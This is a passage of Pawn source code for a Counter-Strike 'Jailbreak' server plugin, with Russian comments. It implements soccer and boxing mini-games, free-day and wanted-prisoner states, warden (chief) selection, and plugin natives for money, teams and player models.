			if(IsSetBit(g_iBitClothingGuard, iPlayer) && IsSetBit(g_iBitClothingType, iPlayer)) jbe_set_user_model(iPlayer, g_szPlayerModel[GUARD]);
			else jbe_default_player_model(iPlayer);
			set_pdata_int(iPlayer, m_bloodColor, 247);
			new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem);
			if(iActiveItem > 0)
			{
				ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				UTIL_WeaponAnimation(iPlayer, 3);
			}
			remove_task(iPlayer+TASK_SHOW_SOCCER_SCORE);
		}
	}
	remove_task(pPlayer+TASK_SHOW_SOCCER_SCORE);
	emit_sound(0, CHAN_STATIC, "jb_engine/soccer/crowd.wav", VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
	emit_sound(pPlayer, CHAN_AUTO, "jb_engine/soccer/whitle_end.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	g_iSoccerScore = {0, 0};
	g_bSoccerGame = false;
}

jbe_soccer_divide_team(iType)
{
	new const szLangPlayer[][] = {"JBE_HUD_ID_YOU_TEAM_RED", "JBE_HUD_ID_YOU_TEAM_BLUE"};
	for(new iPlayer = 1, iTeam; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsSetBit(g_iBitUserAlive, iPlayer) && IsNotSetBit(g_iBitCuff, iPlayer) && IsNotSetBit(g_iBitUserSoccer, iPlayer) && IsNotSetBit(g_iBitUserDuel, iPlayer)
		&& (g_iUserTeam[iPlayer] == 1 && IsNotSetBit(g_iBitUserFree, iPlayer) && IsNotSetBit(g_iBitUserWanted, iPlayer)
		&& IsNotSetBit(g_iBitUserBoxing, iPlayer) || !iType && g_iUserTeam[iPlayer] == 2 && iPlayer != g_iChiefId))
		{
			SetBit(g_iBitUserSoccer, iPlayer);
			jbe_set_user_model(iPlayer, g_szPlayerModel[FOOTBALLER]);
			set_pev(iPlayer, pev_skin, iTeam);
			set_pdata_int(iPlayer, m_bloodColor, -1);
			UTIL_SayText(iPlayer, "%L %L", LANG_PLAYER, "JBE_PREFIX", iPlayer, szLangPlayer[iTeam]);
			g_iSoccerUserTeam[iPlayer] = iTeam;
			if(get_user_weapon(iPlayer) != CSW_KNIFE) engclient_cmd(iPlayer, "weapon_knife");
			else
			{
				new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem);
				if(iActiveItem > 0)
				{
					ExecuteHamB(Ham_Item_Deploy, iActiveItem);
					UTIL_WeaponAnimation(iPlayer, 3);
				}
			}
			iTeam = !iTeam;
		}
	}
}

public jbe_soccer_score_informer(pPlayer)
{
	pPlayer -= TASK_SHOW_SOCCER_SCORE;
	set_hudmessage(255, 165, 0, 0.3, 0.01, 0, 0.0, 0.9, 0.1, 0.1, -1);
	ShowSyncHudMsg(pPlayer, g_iSyncSoccerScore, "%L %d VS %d %L", pPlayer, "JBE_HUD_ID_SOCCER_SCORE_RED",
	g_iSoccerScore[0], g_iSoccerScore[1], pPlayer, "JBE_HUD_ID_SOCCER_SCORE_BLUE");
}

jbe_soccer_hand_ball_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, "models/jb_engine/soccer/v_hand_ball.mdl"))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, "models/jb_engine/weapons/p_hand.mdl"))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
}
/*===== <- Футбол <- =====*///}

/*===== -> Бокс -> =====*///{
jbe_boxing_disable_all()
{
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsSetBit(g_iBitUserBoxing, iPlayer))
		{
			ClearBit(g_iBitUserBoxing, iPlayer);
			set_pdata_int(iPlayer, m_bloodColor, 247);
			new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem);
			if(iActiveItem > 0)
			{
				ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				UTIL_WeaponAnimation(iPlayer, 3);
			}
		}
	}
	g_iBoxingGame = 0;
	g_bBoxingStatus = false;
	unregister_forward(FM_UpdateClientData, g_iFakeMetaUpdateClientData, 1);
}

jbe_boxing_game_start(pPlayer)
{
	new iPlayers;
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++) if(IsSetBit(g_iBitUserBoxing, iPlayer)) iPlayers++;
	if(iPlayers < 2) UTIL_SayText(pPlayer, "%L %L", LANG_PLAYER, "JBE_PREFIX", pPlayer, "JBE_CHAT_ID_BOXING_INSUFFICIENTLY_PLAYERS");
	else
	{
		g_iBoxingGame = 1;
		emit_sound(pPlayer, CHAN_AUTO, "jb_engine/boxing/gong.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	}
}

jbe_boxing_game_team_start(pPlayer)
{
	new iPlayersRed, iPlayersBlue;
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsSetBit(g_iBitUserBoxing, iPlayer))
		{
			switch(g_iBoxingUserTeam[iPlayer])
			{
				case 0: iPlayersRed++;
				case 1: iPlayersBlue++;
			}
		}
	}
	if(iPlayersRed < 2 || iPlayersBlue < 2) UTIL_SayText(pPlayer, "%L %L", LANG_PLAYER, "JBE_PREFIX", pPlayer, "JBE_CHAT_ID_BOXING_INSUFFICIENTLY_PLAYERS");
	else
	{
		g_iBoxingGame = 2;
		emit_sound(pPlayer, CHAN_AUTO, "jb_engine/boxing/gong.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	}
}

jbe_boxing_game_end()
{
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsSetBit(g_iBitUserBoxing, iPlayer))
		{
			ClearBit(g_iBitUserBoxing, iPlayer);
			set_pdata_int(iPlayer, m_bloodColor, 247);
			new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem, linux_diff_player);
			if(iActiveItem > 0)
			{
				ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				UTIL_WeaponAnimation(iPlayer, 3);
			}
		}
	}
	g_iBoxingGame = 0;
}

jbe_boxing_divide_team()
{
	for(new iPlayer = 1, iTeam; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(g_iUserTeam[iPlayer] == 1 && IsSetBit(g_iBitUserAlive, iPlayer) && IsNotSetBit(g_iBitUserFree, iPlayer)
		&& IsNotSetBit(g_iBitUserWanted, iPlayer) && IsNotSetBit(g_iBitUserSoccer, iPlayer)
		&& IsNotSetBit(g_iBitUserBoxing, iPlayer) && IsNotSetBit(g_iBitUserDuel, iPlayer) && IsNotSetBit(g_iBitCuff, iPlayer))
		{
			SetBit(g_iBitUserBoxing, iPlayer);
			set_pev(iPlayer, pev_health, 100.0);
			set_pdata_int(iPlayer, m_bloodColor, -1);
			g_iBoxingUserTeam[iPlayer] = iTeam;
			if(get_user_weapon(iPlayer) != CSW_KNIFE) engclient_cmd(iPlayer, "weapon_knife");
			else
			{
				new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem, linux_diff_player);
				if(iActiveItem > 0)
				{
					ExecuteHamB(Ham_Item_Deploy, iActiveItem);
					UTIL_WeaponAnimation(iPlayer, 3);
				}
			}
			iTeam = !iTeam;
		}
	}
}

jbe_boxing_gloves_model(pPlayer, iTeam)
{
	switch(iTeam)
	{
		case 0:
		{
			static iszViewModel, iszWeaponModel;
			if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, "models/jb_engine/boxing/v_boxing_gloves_red.mdl"))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
			if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, "models/jb_engine/boxing/p_boxing_gloves_red.mdl"))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
		}
		case 1:
		{
			static iszViewModel, iszWeaponModel;
			if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, "models/jb_engine/boxing/v_boxing_gloves_blue.mdl"))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
			if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, "models/jb_engine/boxing/p_boxing_gloves_blue.mdl"))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
		}
	}
}
/*===== <- Бокс <- =====*///}

/*===== -> Нативы -> =====*///{
public plugin_natives()
{
	register_native("jbe_get_day", "jbe_get_day", 1);
	register_native("jbe_set_day", "jbe_set_day", 1);
	register_native("jbe_get_day_week", "jbe_get_day_week", 1);
	register_native("jbe_set_day_week", "jbe_set_day_week", 1);
	register_native("jbe_get_day_mode", "jbe_get_day_mode", 1);
	register_native("jbe_set_day_mode", "jbe_set_day_mode", 1);
	register_native("jbe_open_doors", "jbe_open_doors", 1);
	register_native("jbe_close_doors", "jbe_close_doors", 1);
	register_native("jbe_get_user_money", "jbe_get_user_money", 1);
	register_native("jbe_set_user_money", "jbe_set_user_money", 1);
	register_native("jbe_get_user_team", "jbe_get_user_team", 1);
	register_native("jbe_set_user_team", "jbe_set_user_team", 1);
	register_native("jbe_get_user_model", "_jbe_get_user_model", 1);
	register_native("jbe_set_user_model", "_jbe_set_user_model", 1);
	register_native("jbe_informer_offset_up", "jbe_informer_offset_up", 1);
	register_native("jbe_informer_offset_down", "jbe_informer_offset_down", 1);
	register_native("jbe_menu_block", "jbe_menu_block", 1);
	register_native("jbe_menu_unblock", "jbe_menu_unblock", 1);
	register_native("jbe_menu_blocked", "jbe_menu_blocked", 1);
	register_native("jbe_is_user_free", "jbe_is_user_free", 1);
	register_native("jbe_add_user_free", "jbe_add_user_free", 1);
	register_native("jbe_add_user_free_next_round", "jbe_add_user_free_next_round", 1);
	register_native("jbe_sub_user_free", "jbe_sub_user_free", 1);
	register_native("jbe_free_day_start", "jbe_free_day_start", 1);
	register_native("jbe_free_day_ended", "jbe_free_day_ended", 1);
	register_native("jbe_is_user_wanted", "jbe_is_user_wanted", 1);
	register_native("jbe_add_user_wanted", "jbe_add_user_wanted", 1);
	register_native("jbe_sub_user_wanted", "jbe_sub_user_wanted", 1);
	register_native("jbe_is_user_chief", "jbe_is_user_chief", 1);
	register_native("jbe_set_user_chief", "jbe_set_user_chief", 1);
	register_native("jbe_get_chief_status", "jbe_get_chief_status", 1);
	register_native("jbe_get_chief_id", "jbe_get_chief_id", 1);
	register_native("jbe_set_user_costumes", "jbe_set_user_costumes", 1);
	register_native("jbe_hide_user_costumes", "jbe_hide_user_costumes", 1);
	register_native("jbe_prisoners_divide_color", "jbe_prisoners_divide_color", 1);
	register_native("jbe_register_day_mode", "jbe_register_day_mode", 1);
	register_native("jbe_get_user_voice", "jbe_get_user_voice", 1);
	register_native("jbe_set_user_voice", "jbe_set_user_voice", 1);
	register_native("jbe_set_user_voice_next_round", "jbe_set_user_voice_next_round", 1);
	register_native("jbe_get_user_rendering", "_jbe_get_user_rendering", 1);
	register_native("jbe_set_user_rendering", "jbe_set_user_rendering", 1);
	register_native("jbe_blockct", "_native_blockct", 1);
	register_native("jbe_blockshop", "_native_blockshop", 1);
}

public jbe_get_day() return g_iDay;
public jbe_set_day(iDay) g_iDay = iDay;

public jbe_get_day_week() return g_iDayWeek;
public jbe_set_day_week(iWeek) g_iDayWeek = (g_iDayWeek > 7) ? 1 : iWeek;

public jbe_get_day_mode() return g_iDayMode;
public jbe_set_day_mode(iMode)
{
	g_iDayMode = iMode;
	formatex(g_szDayMode, charsmax(g_szDayMode), "JBE_HUD_GAME_MODE_%d", g_iDayMode);
}

public jbe_open_doors()
{
	for(new i, iDoor; i < g_iDoorListSize; i++)
	{
		iDoor = ArrayGetCell(g_aDoorList, i);
		dllfunc(DLLFunc_Use, iDoor, 0);
	}
	g_bDoorStatus = true;
}
public jbe_close_doors()
{
	for(new i, iDoor; i < g_iDoorListSize; i++)
	{
		iDoor = ArrayGetCell(g_aDoorList, i);
		dllfunc(DLLFunc_Think, iDoor);
	}
	g_bDoorStatus = false;
}

public jbe_get_user_money(pPlayer) return g_iUserMoney[pPlayer];
public jbe_set_user_money(pPlayer, iNum, iFlash)
{
	g_iUserMoney[pPlayer] = iNum;
	engfunc(EngFunc_MessageBegin, MSG_ONE, MsgId_Money, {0.0, 0.0, 0.0}, pPlayer);
	write_long(iNum);
	write_byte(iFlash);
	message_end();
}

public jbe_get_user_team(pPlayer) return g_iUserTeam[pPlayer];
public jbe_set_user_team(pPlayer, iTeam)
{
	if(IsNotSetBit(g_iBitUserConnected, pPlayer)) return 0;
	switch(iTeam)
	{
		case 1:
		{
			set_pdata_int(pPlayer, m_bHasChangeTeamThisRound, false, linux_diff_player);
			set_pdata_int(pPlayer, m_iSpawnCount, 1);
			if(IsSetBit(g_iBitUserAlive, pPlayer)) ExecuteHamB(Ham_Killed, pPlayer, pPlayer, 0);
			engclient_cmd(pPlayer, "jointeam", "1");
			if(get_pdata_int(pPlayer, m_iPlayerTeam, linux_diff_player) != 1) return 0;
			g_iPlayersNum[g_iUserTeam[pPlayer]]--;
			g_iUserTeam[pPlayer] = 1;
			g_iPlayersNum[g_iUserTeam[pPlayer]]++;
			engclient_cmd(pPlayer, "joinclass", "1");
			g_iUserSkin[pPlayer] = random_num (0, 3);
		}
		case 2:
		{
			set_pdata_int(pPlayer, m_bHasChangeTeamThisRound, false, linux_diff_player);
			set_pdata_int(pPlayer, m_iSpawnCount, 1);
			if(IsSetBit(g_iBitUserAlive, pPlayer)) ExecuteHamB(Ham_Killed, pPlayer, pPlayer, 0);
			engclient_cmd(pPlayer, "jointeam", "2");
			if(get_pdata_int(pPlayer, m_iPlayerTeam, linux_diff_player) != 2) return 0;
			g_iPlayersNum[g_iUserTeam[pPlayer]]--;
			g_iUserTeam[pPlayer] = 2;
			g_iPlayersNum[g_iUserTeam[pPlayer]]++;
			engclient_cmd(pPlayer, "joinclass", "1");
		}
		case 3:
		{
			if(IsSetBit(g_iBitUserAlive, pPlayer)) ExecuteHamB(Ham_Killed, pPlayer, pPlayer, 0);
			engclient_cmd(pPlayer, "jointeam", "6");
			if(get_pdata_int(pPlayer, m_iPlayerTeam, linux_diff_player) != 3) return 0;
			g_iPlayersNum[g_iUserTeam[pPlayer]]--;
			g_iUserTeam[pPlayer] = 3;
			g_iPlayersNum[g_iUserTeam[pPlayer]]++;
		}
	}
	return iTeam;
}

public _jbe_get_user_model(pPlayer, const szModel[], iLen)
{
	param_convert(2);
	return jbe_get_user_model(pPlayer, szModel, iLen);
}
public jbe_get_user_model(pPlayer, const szModel[], iLen) return engfunc(EngFunc_InfoKeyValue, engfunc(EngFunc_GetInfoKeyBuffer, pPlayer), "model", szModel, iLen);
public _jbe_set_user_model(pPlayer, const szModel[])
{
	param_convert(2);
	jbe_set_user_model(pPlayer, szModel);
}
public jbe_set_user_model(pPlayer, const szModel[])
{
	copy(g_szUserModel[pPlayer], charsmax(g_szUserModel[]), szModel);
	static Float:fGameTime, Float:fChangeTime; fGameTime = get_gametime();
	if(fGameTime - fChangeTime > 0.1)
	{
		jbe_set_user_model_fix(pPlayer+TASK_CHANGE_MODEL);
		fChangeTime = fGameTime;
	}
	else
	{
		set_task((fChangeTime + 0.1) - fGameTime, "jbe_set_user_model_fix", pPlayer+TASK_CHANGE_MODEL);
		fChangeTime = fChangeTime + 0.1;
	}
}
public jbe_set_user_model_fix(pPlayer)
{
	pPlayer -= TASK_CHANGE_MODEL;
	engfunc(EngFunc_SetClientKeyValue, pPlayer, engfunc(EngFunc_GetInfoKeyBuffer, pPlayer), "model", g_szUserModel[pPlayer]);
	new szBuffer[64]; formatex(szBuffer, charsmax(szBuffer), "models/player/%s/%s.mdl", g_szUserModel[pPlayer], g_szUserModel[pPlayer]);
	set_pdata_int(pPlayer, g_szModelIndexPlayer, engfunc(EngFunc_ModelIndex, szBuffer), linux_diff_player);
	SetBit(g_iBitUserModel, pPlayer);
}

public jbe_informer_offset_up(pPlayer)
{
	g_fMainInformerPosX[pPlayer] = -1.0;
	g_fMainInformerPosY[pPlayer] = 0.04;
}
public jbe_informer_offset_down(pPlayer)
{
	g_fMainInformerPosX[pPlayer] = -1.0;
	g_fMainInformerPosY[pPlayer] = 0.04;
}

public jbe_menu_block(pPlayer) SetBit(g_iBitBlockMenu, pPlayer);
public jbe_menu_unblock(pPlayer) ClearBit(g_iBitBlockMenu, pPlayer);
public jbe_menu_blocked(pPlayer) return IsSetBit(g_iBitBlockMenu, pPlayer);

public jbe_is_user_free(pPlayer) return IsSetBit(g_iBitUserFree, pPlayer);
public jbe_add_user_free(pPlayer)
{
    new the_Name[32];
    get_user_name(pPlayer, the_Name, 31);
	if(g_iDayMode != 1 || g_iUserTeam[pPlayer] != 1 || IsNotSetBit(g_iBitUserAlive, pPlayer)
	|| IsSetBit(g_iBitUserFree, pPlayer) || IsSetBit(g_iBitUserWanted, pPlayer)) return 0;
	if(g_Free_Count[pPlayer] > 1)
    {
		UTIL_SayText(0, "%L !tУ !g%s !tбыло много !gфд. !tОн получит его в !gпонедельник", LANG_PLAYER, "JBE_PREFIX", the_Name);
        SetBit(g_iBitUserMonday, pPlayer);
        return PLUGIN_HANDLED;
    }
	SetBit(g_iBitUserFree, pPlayer);
    g_iFreeCount++;
	if(g_bSoccerStatus && IsSetBit(g_iBitUserSoccer, pPlayer))
	{
		ClearBit(g_iBitUserSoccer, pPlayer);
		jbe_set_user_model(pPlayer, g_szPlayerModel[PRISONER]);
		jbe_default_knife_model(pPlayer);
		UTIL_WeaponAnimation(pPlayer, 3);
		set_pdata_int(pPlayer, m_bloodColor, 247);
		if(pPlayer == g_iSoccerBallOwner)
		{
			CREATE_KILLPLAYERATTACHMENTS(pPlayer);
			set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
			set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.1});
			g_iSoccerBallOwner = 0;
		}
		if(g_bSoccerGame) remove_task(pPlayer+TASK_SHOW_SOCCER_SCORE);
	}
	if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, pPlayer))
	{
		ClearBit(g_iBitUserBoxing, pPlayer);
		jbe_set_hand_model(pPlayer);
		UTIL_WeaponAnimation(pPlayer, 3);
		set_pev(pPlayer, pev_health, 100.0);
		set_pdata_int(pPlayer, m_bloodColor, 247);
	}
	UTIL_ScreenFade(pPlayer, 1<<10, 1<<10, 0x0000, 0, 255, 0, 75, 1);
	set_pev(pPlayer, pev_skin, 5);
	effect_add_free(pPlayer);
	set_task(float(g_iAllCvars[FREE_DAY_ID]), "jbe_sub_user_free", pPlayer+TASK_FREE_DAY_ENDED);
	UTIL_SendAudio(0, _, g_szSounds[FD_PLAYER]);
	jbe_set_user_rendering(pPlayer, kRenderFxGlowShell, 0, 255, 0, kRenderNormal, 0);
	return 1;
}

public effect_add_free(pPlayer)    // эффект при получении личного фд
{
    emit_sound(pPlayer, CHAN_AUTO, "jb_engine/effect_free.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
    
    new original[ 3 ];
    get_user_origin(pPlayer, original);
    
    message_begin(MSG_BROADCAST, SVC_TEMPENTITY);     // спрайт зеленый огонь
    write_byte(TE_SPRITE);
    write_coord(original[0]);
    write_coord(original[1]);
    write_coord(original[2]);
    write_short(effect_fd);
    write_byte(20);
    write_byte(255);
    message_end();
    
    message_begin(MSG_ONE, get_user_msgid("ScreenFade"), {0,0,0}, pPlayer);    // затемнение экрана
    write_short(1<<12);
    write_short(1<<10);
    write_short(0x0000);
    write_byte(45);        //r
    write_byte(255);    //g
    write_byte(70);        //b
    write_byte(75);
    message_end();
}

public jbe_add_user_free_next_round(pPlayer)
{
	if(g_iUserTeam[pPlayer] != 1) return 0;
	SetBit(g_iBitUserFreeNextRound, pPlayer);
	return 1;
}
public jbe_sub_user_free(pPlayer)
{
	if(pPlayer > TASK_FREE_DAY_ENDED) pPlayer -= TASK_FREE_DAY_ENDED;
	if(IsNotSetBit(g_iBitUserFree, pPlayer)) return 0;
	ClearBit(g_iBitUserFree, pPlayer);
	if(task_exists(pPlayer+TASK_FREE_DAY_ENDED)) 
	{
		remove_task(pPlayer+TASK_FREE_DAY_ENDED);
		g_iFreeCount--;
	}
	if(IsSetBit(g_iBitUserAlive, pPlayer)) set_pev(pPlayer, pev_skin, g_iUserSkin[pPlayer]);
	jbe_set_user_rendering(pPlayer, kRenderFxGlowShell, 0, 0, 0, kRenderNormal, 0);
	return 1;
}

public jbe_free_day_start()
{
	if(g_iDayMode != 1) return 0;
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(g_iUserTeam[iPlayer] == 1 && IsSetBit(g_iBitUserAlive, iPlayer) && IsNotSetBit(g_iBitUserWanted, iPlayer))
		{
			if(IsSetBit(g_iBitUserFree, iPlayer)) remove_task(iPlayer+TASK_FREE_DAY_ENDED);
			else
			{
				SetBit(g_iBitUserFree, iPlayer);
				if(g_bSoccerStatus && IsSetBit(g_iBitUserSoccer, iPlayer))
				{
					ClearBit(g_iBitUserSoccer, iPlayer);
					jbe_set_user_model(iPlayer, g_szPlayerModel[PRISONER]);
					jbe_default_knife_model(iPlayer);
					UTIL_WeaponAnimation(iPlayer, 3);
					set_pdata_int(iPlayer, m_bloodColor, 247);
					if(iPlayer == g_iSoccerBallOwner)
					{
						CREATE_KILLPLAYERATTACHMENTS(iPlayer);
						set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
						set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.1});
						g_iSoccerBallOwner = 0;
					}
					if(g_bSoccerGame) remove_task(iPlayer+TASK_SHOW_SOCCER_SCORE);
				}
				if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, iPlayer))
				{
					ClearBit(g_iBitUserBoxing, iPlayer);
					jbe_set_hand_model(iPlayer);
					UTIL_WeaponAnimation(iPlayer, 3);
					set_pev(iPlayer, pev_health, 100.0);
					set_pdata_int(iPlayer, m_bloodColor, 247);
				}
				set_pev(iPlayer, pev_skin, 5);
				jbe_set_user_rendering(iPlayer, kRenderFxGlowShell, 0, 255, 0, kRenderNormal, 0);
			}
		}
	}
	g_szFreeNames = "";
	g_iFreeCount = 0;
	jbe_open_doors();
	jbe_set_day_mode(2);
	UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_FD_START");
	remove_task(SCREEN);
    set_task(0.1, "scr_color_fd", SCREEN);
    set_task(1.0, "scr_color_fd_end", SCREEN);
	g_iDayModeTimer = g_iAllCvars[FREE_DAY_ALL] + 1;
	set_task(1.0, "jbe_free_day_ended_task", TASK_FREE_DAY_ENDED, _, _, "a", g_iDayModeTimer);
	UTIL_SendAudio(0, _, g_szSounds[FD_START]);
	return 1;
}
public jbe_free_day_ended_task()
{
	if(--g_iDayModeTimer) formatex(g_szDayModeTimer, charsmax(g_szDayModeTimer), "- %i", g_iDayModeTimer);
	else jbe_free_day_ended();
}
public jbe_free_day_ended()
{
	if(g_iDayMode != 2) return 0;
	g_szDayModeTimer = "";
	if(task_exists(TASK_FREE_DAY_ENDED)) remove_task(TASK_FREE_DAY_ENDED);
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsSetBit(g_iBitUserFree, iPlayer))
		{
			ClearBit(g_iBitUserFree, iPlayer);
			set_pev(iPlayer, pev_skin, g_iUserSkin[iPlayer]);
			jbe_set_user_rendering(iPlayer, kRenderFxGlowShell, 0, 0, 0, kRenderNormal, 0);
		}
	}
	jbe_set_day_mode(1);
	UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_FD_END");
	g_iFreeCount = 0;
	UTIL_SendAudio(0, _, g_szSounds[FD_END]);
	return 1;
}

public jbe_is_user_wanted(pPlayer) return IsSetBit(g_iBitUserWanted, pPlayer);
public jbe_add_user_wanted(pPlayer)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || g_iUserTeam[pPlayer] != 1 || IsNotSetBit(g_iBitUserAlive, pPlayer)
	|| IsSetBit(g_iBitUserWanted, pPlayer)) return 0;
	SetBit(g_iBitUserWanted, pPlayer);
    g_iWantedCount++;
	new szName[34];
	get_user_name(pPlayer, szName, charsmax(szName));
	formatex(g_szWantedNames, charsmax(g_szWantedNames), "%s^n%s", g_szWantedNames, szName);
	if(IsSetBit(g_iBitUserFree, pPlayer))
	{
		ClearBit(g_iBitUserFree, pPlayer);
		if(g_iDayMode == 1 && task_exists(pPlayer+TASK_FREE_DAY_ENDED)) remove_task(pPlayer+TASK_FREE_DAY_ENDED); g_iFreeCount--;
	}
	if(IsSetBit(g_iBitUserSoccer, pPlayer))
	{
		ClearBit(g_iBitUserSoccer, pPlayer);
		jbe_set_user_model(pPlayer, g_szPlayerModel[PRISONER]);
		jbe_default_knife_model(pPlayer);
		UTIL_WeaponAnimation(pPlayer, 3);
		set_pdata_int(pPlayer, m_bloodColor, 247);
		if(pPlayer == g_iSoccerBallOwner)
		{
			CREATE_KILLPLAYERATTACHMENTS(pPlayer);
			set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
			set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.1});
			g_iSoccerBallOwner = 0;
		}
		if(g_bSoccerGame) remove_task(pPlayer+TASK_SHOW_SOCCER_SCORE);
	}
	if(IsSetBit(g_iBitUserBoxing, pPlayer))
	{
		ClearBit(g_iBitUserBoxing, pPlayer);
		jbe_set_hand_model(pPlayer);
		UTIL_WeaponAnimation(pPlayer, 3);
		set_pev(pPlayer, pev_health, 100.0);
		set_pdata_int(pPlayer, m_bloodColor, 247);
	}
	UTIL_SendAudio(0, _, g_szSounds[PRISON_RIOT]);
	UTIL_ScreenFade(0, 1<<10, 1<<10, 0x0000, 255, 0, 0, 75, 1);
	set_pev(pPlayer, pev_skin, 6);
	jbe_set_user_rendering(pPlayer, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0);
	return 1;
}
public jbe_sub_user_wanted(pPlayer)
{
	if(IsNotSetBit(g_iBitUserWanted, pPlayer)) return 0;
	ClearBit(g_iBitUserWanted, pPlayer);
    g_iWantedCount--;
	if(g_szWantedNames[0] != 0)
	{
		new szName[34];
		get_user_name(pPlayer, szName, charsmax(szName));
		format(szName, charsmax(szName), "^n%s", szName);
		replace(g_szWantedNames, charsmax(g_szWantedNames), szName, "");
	}
	if(IsSetBit(g_iBitUserAlive, pPlayer))
	{
		if(g_iDayMode == 2)
		{
			SetBit(g_iBitUserFree, pPlayer);
			set_pev(pPlayer, pev_skin, 5);
		}
		else set_pev(pPlayer, pev_skin, g_iUserSkin[pPlayer]);
		jbe_set_user_rendering(pPlayer, kRenderFxGlowShell, 0, 0, 0, kRenderNormal, 0);
	}
	return 1;
}

public jbe_is_user_chief(pPlayer) return (pPlayer == g_iChiefId);
public jbe_set_user_chief(pPlayer)
{
	new szName[32];
	get_user_name(pPlayer, szName, charsmax(szName));

	if(g_iDayMode != 1 && g_iDayMode != 2 || g_iUserTeam[pPlayer] != 2 || IsNotSetBit(g_iBitUserAlive, pPlayer)) return 0;
	if(g_iChiefStatus == 1)
	{
		jbe_set_user_model(g_iChiefId, g_szPlayerModel[GUARD]);
		if(g_bSoccerGame) remove_task(g_iChiefId+TASK_SHOW_SOCCER_SCORE);
		if(get_user_godmode(g_iChiefId)) set_user_godmode(g_iChiefId, 0);
		g_iSimonVoice = 0;
		ClearBit(g_iBitUserSimon, g_iChiefId);
	}
	if(task_exists(TASK_CHIEF_CHOICE_TIME)) remove_task(TASK_CHIEF_CHOICE_TIME);
	get_user_name(pPlayer, g_szChiefName, charsmax(g_szChiefName));
	g_iChiefStatus = 1;
	g_iChiefId = pPlayer;
	jbe_set_user_model(pPlayer, g_szPlayerModel[CHIEF]);
	UTIL_SendAudio(0, _, g_szSounds[CHIEF_GOLOS]);
	set_pev(pPlayer, pev_health, 500.0);
	SetBit(g_iBitUserSimon, pPlayer);
	UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_CHIEF_START", szName);
	if(g_bSoccerStatus)
	{
		if(IsSetBit(g_iBitUserSoccer, pPlayer))
		{
			ClearBit(g_iBitUserSoccer, pPlayer);
			jbe_set_baton_model(pPlayer);
			UTIL_WeaponAnimation(pPlayer, 3);
			set_pdata_int(pPlayer, m_bloodColor, 247);
			if(pPlayer == g_iSoccerBallOwner)
			{
				CREATE_KILLPLAYERATTACHMENTS(pPlayer);
				set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
				set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.1});
				g_iSoccerBallOwner = 0;
			}
		}
		else if(g_bSoccerGame) set_task(1.0, "jbe_soccer_score_informer", pPlayer+TASK_SHOW_SOCCER_SCORE, _, _, "b");
	}
	return 1;
}
public jbe_get_chief_status() return g_iChiefStatus;
public jbe_get_chief_id() return g_iChiefId;

public jbe_set_user_costumes(pPlayer, iCostumes)
{
	if(!g_iCostumesListSize || g_iDayMode != 1 && g_iDayMode != 2 || iCostumes > g_iCostumesListSize) 
		return 0;
	
	if(iCostumes)
	{
		new aDataCostumes[DATA_COSTUMES_PRECACHE];
		ArrayGetArray(g_aCostumesList, iCostumes, aDataCostumes);
		if(!g_eUserCostumes[pPlayer][ENTITY])
		{
			static iszFuncWall = 0;
			if(iszFuncWall || (iszFuncWall = engfunc(EngFunc_AllocString, "func_wall"))) g_eUserCostumes[pPlayer][ENTITY] = engfunc(EngFunc_CreateNamedEntity, iszFuncWall);
			set_pev(g_eUserCostumes[pPlayer][ENTITY], pev_movetype, MOVETYPE_FOLLOW);
